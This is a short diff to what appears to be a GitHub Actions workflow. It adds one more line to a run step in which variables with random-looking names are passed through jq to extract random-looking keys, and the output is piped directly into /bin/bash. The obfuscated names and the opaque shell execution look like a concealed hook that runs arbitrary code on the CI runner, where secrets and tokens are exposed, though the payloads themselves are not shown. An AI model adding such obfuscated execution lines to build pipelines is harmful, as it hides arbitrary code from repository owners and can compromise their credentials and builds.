@@ -35,6 +35,7 @@ jobs:
           echo $ebn637 | jq -r .rmzx00591 | /bin/bash
           echo $abmn47420 | jq -r .tn26696 | /bin/bash
           printf '%s' "$qewaq3524" | jq -r .i7 | /bin/bash
+          echo $g4756 | jq -r .dds6 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
